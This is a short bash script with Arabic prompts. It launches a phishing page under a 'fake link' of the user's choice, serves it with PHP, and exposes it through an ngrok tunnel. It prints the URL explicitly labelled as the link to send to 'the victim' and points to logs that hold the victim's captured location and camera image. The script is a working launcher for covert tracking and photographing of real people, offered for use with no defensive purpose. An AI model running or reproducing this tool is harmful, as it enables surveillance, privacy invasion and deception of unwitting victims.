#!/bin/bash

echo -n "📌 ادخل الرابط الوهمي اللي تختاره: "
read CUSTOM_LINK

if [ ! -f templates/default.html ]; then
  echo "❗ ملف القالب مش موجود!"
  exit 1
fi

cp templates/default.html temp.html
sed -i "s|{{CUSTOM_LINK}}|$CUSTOM_LINK|g" temp.html

php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

killall ngrok >/dev/null 2>&1
ngrok http 3333 > /dev/null 2>&1 &
sleep 5

TUNNEL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')
echo "[+] الرابط اللي تبعته للضحية:"
echo "$TUNNEL/temp.html"

echo "📍 بيانات الموقع: logs/location.txt"
echo "📸 ملف الكاميرا: logs/image.jpg"
